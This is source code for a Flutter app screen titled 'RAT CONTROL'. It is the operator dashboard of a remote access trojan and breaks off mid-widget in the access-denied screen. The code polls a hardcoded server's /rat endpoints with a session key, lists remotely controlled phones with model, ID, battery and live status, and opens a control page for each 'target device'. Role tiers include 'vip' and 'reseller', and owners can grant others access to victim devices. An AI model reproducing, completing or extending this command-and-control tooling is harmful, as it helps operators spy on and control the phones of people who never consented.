// ═══════════════════════════════════════════════════════════════════════════
//  DEVICE DASHBOARD — HELL ELEGANCE BRUTAL + LIST LAYOUT (FIXED)
// ═══════════════════════════════════════════════════════════════════════════
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:math' as math;
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'http://www.rexylegal.rxpedia.web.id:2060';

// ═══════════════════════════════════════════════════════════════════════════
class _C {
  static const bg         = Color(0xFF020004);
  static const bgDeep     = Color(0xFF050108);
  static const surface    = Color(0xFF0A0310);
  static const surfaceAlt = Color(0xFF100418);
  static const card       = Color(0xFF080210);

  static const crimson    = Color(0xFF8B1526);
  static const crimsonUp  = Color(0xFFC41E3A);
  static const maroon     = Color(0xFF4A0A14);
  static const burgundy   = Color(0xFF2A0510);

  static const gold       = Color(0xFFB8860B);
  static const goldBright = Color(0xFFE5B94D);
  static const goldGlow   = Color(0xFFF4D03F);

  static const neonGold   = Color(0xFFFFD700);

  static const textP = Color(0xFFF5EDE5);
  static const textS = Color(0xFFB8A090);
  static const textM = Color(0xFF6B5650);

  static const bord     = Color(0xFF2A1418);
  static const bordGlow = Color(0xFF3D1E24);

  static const green  = Color(0xFF50C878);
  static const amber  = Color(0xFFE09540);
  static const red    = Color(0xFFE5384A);
  static const violet = Color(0xFFAA00FF);
  static const cyan   = Color(0xFFFFB84D);

  static const disco1  = Color(0xFFFF3366);
  static const disco2  = Color(0xFFFFAA00);
  static const disco3  = Color(0xFFFF00CC);
  static const disco4  = Color(0xFF00FFFF);
  static const disco5  = Color(0xFFAA00FF);
  static const disco6  = Color(0xFF00FF66);

  static Color discoColor(double p) {
    final colors = [disco1, disco2, disco3, disco4, disco5, disco6];
    final idx = (p * colors.length).floor() % colors.length;
    final nextIdx = (idx + 1) % colors.length;
    final t = (p * colors.length) % 1.0;
    return Color.lerp(colors[idx], colors[nextIdx], t) ?? colors[idx];
  }
}

// ═══════════════════════════════════════════════════════════════════════════
class DeviceDashboardPage extends StatefulWidget {
  final String username, role, sessionKey;
  const DeviceDashboardPage({super.key, this.username='', this.role='', this.sessionKey=''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  PermissionResult? _perm;
  Timer? _timer;

  late AnimationController _pulse, _scanAnim, _shimmer;
  late AnimationController _bgCtrl, _scanCtrl, _discoCtrl, _glitchCtrl, _webCtrl, _floatCtrl;
  late Animation<double> _pulseA, _scan, _disco, _glitch, _float;

  bool get _hasAccess => ['owner','high owner','high admin','admin','vip','reseller'].contains(widget.role.toLowerCase());
  bool get _isOwner   => ['owner','high owner','high admin','admin'].contains(widget.role.toLowerCase());

  @override
  void initState() {
    super.initState();
    _pulse     = AnimationController(vsync:this, duration:const Duration(milliseconds:2000))..repeat(reverse:true);
    _scanAnim  = AnimationController(vsync:this, duration:const Duration(seconds:3))..repeat();
    _shimmer   = AnimationController(vsync:this, duration:const Duration(milliseconds:2500))..repeat();

    _bgCtrl    = AnimationController(vsync:this, duration:const Duration(seconds:30))..repeat();
    _scanCtrl  = AnimationController(vsync:this, duration:const Duration(seconds:6))..repeat();
    _discoCtrl = AnimationController(vsync:this, duration:const Duration(seconds:10))..repeat();
    _glitchCtrl= AnimationController(vsync:this, duration:const Duration(milliseconds:3500))..repeat();
    _webCtrl   = AnimationController(vsync:this, duration:const Duration(seconds:8))..repeat();
    _floatCtrl = AnimationController(vsync:this, duration:const Duration(seconds:4))..repeat(reverse:true);

    _pulseA = Tween<double>(begin:0.5, end:1.0).animate(CurvedAnimation(parent:_pulse, curve:Curves.easeInOut));
    _scan   = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_scanCtrl, curve:Curves.linear));
    _disco  = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_discoCtrl, curve:Curves.linear));
    _glitch = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_glitchCtrl, curve:Curves.linear));
    _float  = Tween<double>(begin:-4.0, end:4.0).animate(CurvedAnimation(parent:_floatCtrl, curve:Curves.easeInOut));

    if (_hasAccess) { _loadAll(); _timer = Timer.periodic(const Duration(seconds:20), (_) => _loadAll()); }
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pulse.dispose(); _scanAnim.dispose(); _shimmer.dispose();
    _bgCtrl.dispose(); _scanCtrl.dispose(); _discoCtrl.dispose();
    _glitchCtrl.dispose(); _webCtrl.dispose(); _floatCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadAll() async {
    if (!mounted || !_hasAccess) return;
    try {
      final pRes = await http.get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}')).timeout(const Duration(seconds:8));
      if (pRes.statusCode==200) {
        final pd=jsonDecode(pRes.body);
        if (pd['valid']==true && pd['pairId']!=null && mounted) {
          setState(()=>_pairId=pd['pairId'].toString());
        }
      }
      final dRes = await http.get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}')).timeout(const Duration(seconds:10));
      if (!mounted) return;
      if (dRes.statusCode!=200) { setState(() { _loading=false; _errorMsg='Server error ${dRes.statusCode}'; }); return; }
      final body = jsonDecode(dRes.body);
      if (body['valid']!=true) { setState(() { _loading=false; _errorMsg=body['message']??'Error'; }); return; }
      List<dynamic> devices = List<dynamic>.from(body['devices']??[]);
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen=DateTime.parse(d['lastSeen']?.toString()??'');
          d['online']=now.difference(seen).inSeconds<30;
        } catch(_) { d['online']=false; }
      }
      PermissionResult perm = _isOwner
        ? PermissionResult(approved:true,allDevices:true,devices:[])
        : await DevicePermissionStore.getFor(widget.username,widget.sessionKey);
      if (mounted) setState(() { _visible=devices; _perm=perm; _loading=false; _errorMsg=null; });
    } catch(e) { if (mounted) setState(() { _loading=false; _errorMsg=e.toString(); }); }
  }

  int get _active => _visible.where((d)=>d['online']==true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text:_pairId));
    ScaffoldMessenger.of(context).clearSnackBars();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _C.card,
      content: Row(children:[
        Container(width:22,height:22,decoration:BoxDecoration(
          gradient:const LinearGradient(colors:[_C.green, _C.goldBright]),
          shape:BoxShape.circle),
          child:const Icon(Icons.check_rounded,color:_C.bg,size:13)),
        const SizedBox(width:10),
        const Text('Pairing ID tersalin!',style:TextStyle(
          fontFamily:'ShareTechMono', color:_C.textP,fontSize:12,fontWeight:FontWeight.w600)),
      ]),
      duration:const Duration(seconds:2), behavior:SnackBarBehavior.floating,
      shape:RoundedRectangleBorder(
        borderRadius:BorderRadius.circular(12),
        side: BorderSide(color: _C.goldBright.withOpacity(0.5), width: 1.2)),
      margin:const EdgeInsets.all(16),
    ));
  }

  @override
  Widget build(BuildContext context) {
    if (!_hasAccess) return _accessDenied();
    final denied = _perm!=null && !_perm!.approved && !_isOwner;

    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(children: [
        // ppp.jpg background
        Positioned.fill(
          child: Image.asset(
            'assets/images/ppp.jpg',
            fit: BoxFit.cover,
            errorBuilder: (_, __, ___) => Container(color: _C.bg),
          ),
        ),
        Positioned.fill(
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  _C.bg.withOpacity(0.82),
                  _C.bgDeep.withOpacity(0.7),
                  _C.bg.withOpacity(0.9),
                ],
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
              ),
            ),
          ),
        ),
        AnimatedBuilder(
          animation: Listenable.merge([_bgCtrl, _discoCtrl, _glitchCtrl]),
          builder: (_, __) => CustomPaint(
            painter: _HoloBgPainter(_bgCtrl.value, _disco.value, _glitch.value),
            child: const SizedBox.expand(),
          ),
        ),
        AnimatedBuilder(animation:_scan, builder:(_,__)=>Positioned(
          top: _scan.value * MediaQuery.of(context).size.height,
          left:0, right:0,
          child: Container(
            height:1.5,
            decoration:BoxDecoration(
              gradient:LinearGradient(colors:[
                Colors.transparent, _C.gold.withOpacity(.12),
                _C.crimsonUp.withOpacity(.3), _C.gold.withOpacity(.12),
                Colors.transparent,
              ]),
            ),
          ),
        )),
        SafeArea(
          child: Column(children:[
            _buildAppBar(),
            _buildHeader(),
            if (_errorMsg!=null) _banner(Icons.error_outline_rounded, _errorMsg!, _C.red),
            if (denied && _errorMsg==null) _banner(Icons.lock_outline_rounded,'Akses belum disetujui. Hubungi Owner.',_C.violet),
            if (!_isOwner && !denied && _errorMsg==null && _perm?.approved==true)
              _banner(Icons.verified_user_rounded,'Akses telah diizinkan.',_C.green),
            _buildToolbar(denied),
            Expanded(child:_buildBody(denied)),
          ]),
        ),
      ]),
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // APPBAR
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildAppBar() => Padding(
    padding: const EdgeInsets.fromLTRB(14, 12, 14, 0),
    child: AnimatedBuilder(
      animation: _discoCtrl,
      builder: (_, __) {
        final dc = _C.discoColor(_disco.value);
        return Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            color: Colors.black.withOpacity(0.4),
            gradient: LinearGradient(
              colors: [dc.withOpacity(0.15), dc.withOpacity(0.03)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            border: Border.all(color: _C.goldBright.withOpacity(0.5), width: 1.2),
            boxShadow: [
              BoxShadow(color: dc.withOpacity(0.3), blurRadius: 20, spreadRadius: 1),
              BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 10, offset: const Offset(0, 4)),
            ],
          ),
          child: Stack(children: [
            Positioned(top: 4, left: 4, child: _corner(_C.goldBright, 12, 1.5, topLeft: true)),
            Positioned(top: 4, right: 4, child: _corner(_C.goldBright, 12, 1.5, topRight: true)),
            Positioned(bottom: 4, left: 4, child: _corner(_C.goldBright, 12, 1.5, bottomLeft: true)),
            Positioned(bottom: 4, right: 4, child: _corner(_C.goldBright, 12, 1.5, bottomRight: true)),
            Row(children: [
              GestureDetector(
                onTap: ()=>Navigator.pop(context),
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    gradient: const LinearGradient(
                      colors: [_C.crimsonUp, _C.maroon],
                      begin: Alignment.topLeft, end: Alignment.bottomRight,
                    ),
                    border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                    boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.4), blurRadius: 10)],
                  ),
                  child: const Icon(Icons.arrow_back_ios_new_rounded, color: _C.goldBright, size: 16),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  ShaderMask(
                    shaderCallback: (b) => const LinearGradient(
                      colors: [_C.goldGlow, _C.crimsonUp],
                    ).createShader(b),
                    child: const Text('RAT CONTROL', style: TextStyle(
                      fontFamily: 'Ganang', fontSize: 14, fontWeight: FontWeight.w900,
                      color: Colors.white, letterSpacing: 2)),
                  ),
                  Text('by ${widget.username}', style: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 8, color: _C.textS)),
                ],
              )),
              // LIVE dot
              AnimatedBuilder(
                animation: _pulse,
                builder: (_, __) => Container(
                  width: 8, height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle, color: _C.green,
                    boxShadow: [BoxShadow(
                      color: _C.green.withOpacity(0.5+0.5*_pulseA.value),
                      blurRadius: 10,
                    )],
                  ),
                ),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: (){ setState(() { _loading=true; _errorMsg=null; }); _loadAll(); },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    gradient: LinearGradient(
                      colors: [_C.goldBright.withOpacity(0.15), _C.goldBright.withOpacity(0.05)],
                    ),
                    border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                  ),
                  child: Row(mainAxisSize: MainAxisSize.min, children: [
                    const Icon(Icons.sync_rounded, color: _C.goldBright, size: 14),
                    const SizedBox(width: 5),
                    const Text('SYNC', style: TextStyle(
                      fontFamily: 'Orbitron', color: _C.goldBright,
                      fontSize: 8, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
                  ]),
                ),
              ),
            ]),
          ]),
        );
      },
    ),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // HEADER
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildHeader() => Padding(
    padding: const EdgeInsets.fromLTRB(14, 14, 14, 0),
    child: Column(children: [
      Row(children: [
        Expanded(child: _statCard('ONLINE', '$_active', _C.green, Icons.wifi_rounded)),
        const SizedBox(width: 8),
        Expanded(child: _statCard('OFFLINE', '${_visible.length-_active}', _C.red, Icons.wifi_off_rounded)),
        const SizedBox(width: 8),
        Expanded(child: _statCard('TOTAL', '${_visible.length}', _C.goldBright, Icons.devices_rounded)),
      ]),
      if (_pairId.isNotEmpty) ...[
        const SizedBox(height: 12),
        _buildPairingCard(),
      ],
    ]),
  );

  Widget _statCard(String label, String val, Color c, IconData icon) => AnimatedBuilder(
    animation: _discoCtrl,
    builder: (_, __) {
      final dc = _C.discoColor(_disco.value);
      return Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 10),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: Colors.black.withOpacity(0.4),
          gradient: LinearGradient(
            colors: [dc.withOpacity(0.15), dc.withOpacity(0.03)],
            begin: Alignment.topLeft, end: Alignment.bottomRight,
          ),
          border: Border.all(color: c.withOpacity(0.4), width: 1.2),
          boxShadow: [BoxShadow(color: dc.withOpacity(0.2), blurRadius: 10)],
        ),
        child: Stack(children: [
          Positioned.fill(child: CustomPaint(
            painter: _GlitchPainter(progress: _glitch.value, color: dc),
          )),
          Row(children: [
            Container(width: 30, height: 30,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [c.withOpacity(0.25), c.withOpacity(0.08)],
                ),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: c.withOpacity(0.5), width: 1),
                boxShadow: [BoxShadow(color: c.withOpacity(0.3), blurRadius: 6)],
              ),
              child: Icon(icon, color: c, size: 14),
            ),
            const SizedBox(width: 8),
            Expanded(child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(val, style: TextStyle(
                  fontFamily: 'Ganang', color: c, fontSize: 18,
                  fontWeight: FontWeight.w900, height: 1)),
                Text(label, style: const TextStyle(
                  fontFamily: 'Orbitron', color: _C.textS,
                  fontSize: 7, letterSpacing: 1.5, fontWeight: FontWeight.w700)),
              ],
            )),
          ]),
        ]),
      );
    },
  );

  Widget _buildPairingCard() => AnimatedBuilder(
    animation: Listenable.merge([_discoCtrl, _pulse]),
    builder: (_, __) {
      final dc = _C.discoColor((_disco.value + 0.5) % 1.0);
      return GestureDetector(
        onTap: _copyPairId,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            color: Colors.black.withOpacity(0.4),
            gradient: LinearGradient(
              colors: [dc.withOpacity(0.15), dc.withOpacity(0.03)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            border: Border.all(
              color: _C.goldBright.withOpacity(0.5 + 0.2 * _pulseA.value),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(color: dc.withOpacity(0.3), blurRadius: 18, spreadRadius: 1),
              BoxShadow(color: _C.goldBright.withOpacity(0.15 * _pulseA.value), blurRadius: 24),
            ],
          ),
          child: Stack(children: [
            Positioned.fill(child: CustomPaint(
              painter: _GlitchPainter(progress: _glitch.value, color: dc),
            )),
            Positioned(top: 3, left: 3, child: _corner(_C.goldBright, 10, 1.5, topLeft: true)),
            Positioned(top: 3, right: 3, child: _corner(_C.goldBright, 10, 1.5, topRight: true)),
            Positioned(bottom: 3, left: 3, child: _corner(_C.goldBright, 10, 1.5, bottomLeft: true)),
            Positioned(bottom: 3, right: 3, child: _corner(_C.goldBright, 10, 1.5, bottomRight: true)),
            Row(children: [
              Container(width: 44, height: 44,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_C.crimsonUp, _C.maroon],
                    begin: Alignment.topLeft, end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                  boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.4), blurRadius: 10)],
                ),
                child: const Icon(Icons.qr_code_2_rounded, color: _C.goldBright, size: 22),
              ),
              const SizedBox(width: 12),
              Expanded(child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text('PAIRING ID', style: TextStyle(
                    fontFamily: 'Orbitron', color: _C.textS,
                    fontSize: 8, letterSpacing: 2.5, fontWeight: FontWeight.w700)),
                  const SizedBox(height: 4),
                  Text(_pairId, style: const TextStyle(
                    fontFamily: 'Ganang', color: _C.goldBright,
                    fontSize: 15, fontWeight: FontWeight.w900, letterSpacing: 3)),
                ],
              )),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  gradient: LinearGradient(
                    colors: [_C.goldBright.withOpacity(0.2), _C.goldBright.withOpacity(0.08)],
                  ),
                  border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                  boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.3), blurRadius: 8)],
                ),
                child: const Icon(Icons.copy_all_rounded, color: _C.goldBright, size: 16),
              ),
            ]),
          ]),
        ),
      );
    },
  );

  // ══════════════════════════════════════════════════════════════════════════
  // TOOLBAR
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildToolbar(bool denied) => Padding(
    padding: const EdgeInsets.fromLTRB(14, 16, 14, 8),
    child: Row(children: [
      Container(
        width: 4, height: 18,
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            colors: [_C.crimsonUp, _C.goldBright],
            begin: Alignment.topCenter, end: Alignment.bottomCenter,
          ),
          borderRadius: BorderRadius.circular(3),
          boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.6), blurRadius: 8)],
        ),
      ),
      const SizedBox(width: 10),
      const Text('DEVICE LIST', style: TextStyle(
        fontFamily: 'Ganang', color: _C.textP,
        fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2.5)),
      const Spacer(),
      if (_isOwner)
        GestureDetector(
          onTap: () async {
            await Navigator.push(context, MaterialPageRoute(
              builder:(_)=>DevicePermissionManagerPage(
                sessionKey: widget.sessionKey, allDevices: _visible,
              ),
            ));
            _loadAll();
          },
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(10),
              gradient: LinearGradient(
                colors: [_C.violet.withOpacity(0.2), _C.violet.withOpacity(0.06)],
              ),
              border: Border.all(color: _C.violet.withOpacity(0.5), width: 1.2),
              boxShadow: [BoxShadow(color: _C.violet.withOpacity(0.2), blurRadius: 12)],
            ),
            child: Row(mainAxisSize: MainAxisSize.min, children: [
              const Icon(Icons.shield_rounded, color: _C.violet, size: 13),
              const SizedBox(width: 6),
              const Text('AKSES', style: TextStyle(
                fontFamily: 'Ganang', color: _C.violet,
                fontSize: 9, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
            ]),
          ),
        ),
    ]),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // BODY
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildBody(bool denied) {
    if (_loading) return _loadingState();
    if (_visible.isEmpty) return _emptyState(denied);

    return ListView.builder(
      physics: const BouncingScrollPhysics(),
      padding: const EdgeInsets.fromLTRB(14, 4, 14, 30),
      itemCount: _visible.length,
      itemBuilder: (ctx, i) => _deviceRow(ctx, _visible[i], i),
    );
  }

  Widget _deviceRow(BuildContext ctx, dynamic device, int index) {
    final d  = Map<String,dynamic>.from(device as Map);
    final on = d['online']==true;
    final batt = int.tryParse(d['battery']?.toString()??'0')??0;
    Color battColor = batt>60 ? _C.green : batt>25 ? _C.amber : _C.red;

    return AnimatedBuilder(
      animation: Listenable.merge([_discoCtrl, _glitchCtrl, _webCtrl]),
      builder: (context, _) {
        final dc = _C.discoColor((_disco.value + index * 0.12) % 1.0);

        return TweenAnimationBuilder<double>(
          tween: Tween(begin: 0, end: 1),
          duration: Duration(milliseconds: 400 + (index * 80)),
          curve: Curves.easeOutCubic,
          builder: (_, v, child) => Opacity(
            opacity: v,
            child: Transform.translate(offset: Offset(0, 16 * (1 - v)), child: child),
          ),
          child: GestureDetector(
            onTap: () => Navigator.push(ctx, MaterialPageRoute(
              builder: (_) => ControlCenterPage(targetDevice: d, role: widget.role),
            )),
            child: Container(
              margin: const EdgeInsets.only(bottom: 10),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                color: Colors.black.withOpacity(0.4),
                gradient: LinearGradient(
                  colors: on
                      ? [dc.withOpacity(0.2), dc.withOpacity(0.04)]
                      : [Colors.black.withOpacity(0.4), Colors.black.withOpacity(0.2)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                border: Border.all(
                  color: on ? _C.goldBright.withOpacity(0.5) : _C.bord,
                  width: on ? 1.5 : 1,
                ),
                boxShadow: on
                    ? [BoxShadow(color: dc.withOpacity(0.35), blurRadius: 20, spreadRadius: 1)]
                    : [BoxShadow(color: Colors.black.withOpacity(0.4), blurRadius: 8)],
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(14),
                child: Stack(children: [
                  if (on)
                    Positioned.fill(child: CustomPaint(
                      painter: _SpiderWebPainter(
                        progress: _webCtrl.value,
                        color: dc,
                        opacity: 0.12,
                      ),
                    )),
                  Positioned.fill(child: CustomPaint(
                    painter: _GlitchPainter(progress: _glitch.value, color: dc),
                  )),
                  Positioned(top: 4, left: 4, child: _corner(_C.goldBright.withOpacity(0.6), 10, 1.3, topLeft: true)),
                  Positioned(top: 4, right: 4, child: _corner(_C.goldBright.withOpacity(0.6), 10, 1.3, topRight: true)),
                  Positioned(bottom: 4, left: 4, child: _corner(_C.goldBright.withOpacity(0.6), 10, 1.3, bottomLeft: true)),
                  Positioned(bottom: 4, right: 4, child: _corner(_C.goldBright.withOpacity(0.6), 10, 1.3, bottomRight: true)),
                  Padding(
                    padding: const EdgeInsets.all(14),
                    child: Row(children: [
                      AnimatedContainer(
                        duration: const Duration(milliseconds: 250),
                        width: 50, height: 50,
                        decoration: BoxDecoration(
                          gradient: on
                              ? const LinearGradient(
                                  colors: [_C.crimsonUp, _C.maroon],
                                  begin: Alignment.topLeft, end: Alignment.bottomRight,
                                )
                              : const LinearGradient(colors: [_C.surface, _C.card]),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                            color: on ? _C.goldBright.withOpacity(0.6) : _C.bord,
                            width: 1.2,
                          ),
                          boxShadow: on ? [
                            BoxShadow(color: dc.withOpacity(0.5), blurRadius: 12, spreadRadius: 1),
                          ] : [],
                        ),
                        child: Icon(
                          Icons.phone_android_rounded,
                          color: on ? _C.goldBright : _C.textM,
                          size: 22,
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(children: [
                            Expanded(
                              child: Text(
                                d['model']?.toString() ?? 'Unknown Device',
                                style: TextStyle(
                                  fontFamily: 'Ganang',
                                  color: on ? _C.textP : _C.textS,
                                  fontSize: 13,
                                  fontWeight: FontWeight.w800,
                                  letterSpacing: 0.3,
                                ),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                              ),
                            ),
                            const SizedBox(width: 6),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(6),
                                color: (on ? _C.green : _C.red).withOpacity(0.15),
                                border: Border.all(color: (on ? _C.green : _C.red).withOpacity(0.5)),
                              ),
                              child: Row(mainAxisSize: MainAxisSize.min, children: [
                                AnimatedBuilder(
                                  animation: _pulse,
                                  builder: (_, __) => Container(
                                    width: 5, height: 5,
                                    decoration: BoxDecoration(
                                      shape: BoxShape.circle,
                                      color: on ? _C.green : _C.red,
                                      boxShadow: [BoxShadow(
                                        color: (on ? _C.green : _C.red).withOpacity(0.5 + 0.4 * _pulseA.value),
                                        blurRadius: 6,
                                      )],
                                    ),
                                  ),
                                ),
                                const SizedBox(width: 4),
                                Text(
                                  on ? 'LIVE' : 'OFF',
                                  style: TextStyle(
                                    fontFamily: 'Orbitron',
                                    color: on ? _C.green : _C.red,
                                    fontSize: 7,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ]),
                            ),
                          ]),
                          const SizedBox(height: 3),
                          Text(
                            d['id']?.toString() ?? '-',
                            style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              color: _C.textS,
                              fontSize: 9,
                            ),
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                          ),
                          const SizedBox(height: 8),
                          Row(children: [
                            Icon(
                              batt>60 ? Icons.battery_full_rounded
                                  : batt>25 ? Icons.battery_4_bar_rounded
                                  : Icons.battery_alert_rounded,
                              color: battColor,
                              size: 12,
                            ),
                            const SizedBox(width: 4),
                            Text(
                              '$batt%',
                              style: TextStyle(
                                fontFamily: 'Orbitron',
                                color: battColor,
                                fontSize: 10,
                                fontWeight: FontWeight.w800,
                              ),
                            ),
                          ]),
                        ],
                      )),
                      const SizedBox(width: 10),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(10),
                          gradient: LinearGradient(
                            colors: [_C.crimsonUp, _C.maroon],
                            begin: Alignment.topLeft, end: Alignment.bottomRight,
                          ),
                          border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                          boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.4), blurRadius: 10)],
                        ),
                        child: const Icon(Icons.arrow_forward_rounded,
                            color: _C.goldBright, size: 16),
                      ),
                    ]),
                  ),
                ]),
              ),
            ),
          ),
        );
      },
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // STATES
  // ══════════════════════════════════════════════════════════════════════════
  Widget _loadingState() => Center(
    child: Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        AnimatedBuilder(
          animation: _scanAnim,
          builder: (_, __) => CustomPaint(
            size: const Size(70, 70),
            painter: _ScanPainter(_scanAnim.value),
          ),
        ),
        const SizedBox(height: 22),
        const Text('SCANNING DEVICES', style: TextStyle(
          fontFamily: 'Ganang', color: _C.goldBright,
          fontSize: 12, letterSpacing: 3, fontWeight: FontWeight.w900)),
        const SizedBox(height: 6),
        const Text('Mengambil data...', style: TextStyle(
          fontFamily: 'ShareTechMono', color: _C.textM, fontSize: 10)),
      ],
    ),
  );

  Widget _emptyState(bool denied) => Center(
    child: Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        Container(
          width: 90, height: 90,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            gradient: RadialGradient(colors: [
              (denied ? _C.violet : _C.crimsonUp).withOpacity(0.2),
              Colors.transparent,
            ]),
            border: Border.all(
              color: denied ? _C.violet.withOpacity(0.4) : _C.goldBright.withOpacity(0.3),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: (denied ? _C.violet : _C.crimsonUp).withOpacity(0.2),
                blurRadius: 24,
              ),
            ],
          ),
          child: Icon(
            denied ? Icons.lock_person_rounded : Icons.devices_other_rounded,
            color: denied ? _C.violet : _C.goldBright,
            size: 40,
          ),
        ),
        const SizedBox(height: 20),
        Text(denied ? 'AKSES DITOLAK' : 'NO DEVICE', style: const TextStyle(
          fontFamily: 'Ganang', color: _C.textP,
          fontWeight: FontWeight.w900, letterSpacing: 3, fontSize: 14)),
        const SizedBox(height: 8),
        Text(
          denied ? 'Hubungi Owner untuk mendapat akses' : 'Belum ada device terhubung',
          style: const TextStyle(fontFamily: 'ShareTechMono', color: _C.textM, fontSize: 11),
        ),
      ],
    ),
  );

  Widget _accessDenied() => Scaffold(
    backgroundColor: _C.bg,
    body: Stack(children: [
      Positioned.fill(
        child: Image.asset(
          'assets/images/ppp.jpg',
          fit: BoxFit.cover,
          errorBuilder: (_, __, ___) => Container(color: _C.bg),
        ),
      ),
      Positioned.fill(
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [
                _C.bg.withOpacity(0.9),
                _C.bgDeep.withOpacity(0.85),
                _C.bg.withOpacity(0.95),
              ],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
        ),
      ),
      Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 100, height: 100,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(colors: [
                    _C.violet.withOpacity(0.3),
                    Colors.transparent,
                  ]),
                  border: Border.all(color: _C.violet.withOpacity(0.5), width: 1.5),
                  boxShadow: [BoxShadow(color: _C.violet.withOpacity(0.3), blurRadius: 30)],
                ),
                child: const Icon(Icons.lock_person_rounded, color: _C.violet, size: 48),
              ),
              const SizedBox(height: 28),
              const Text('AKSES TERBATAS', style: TextStyle(
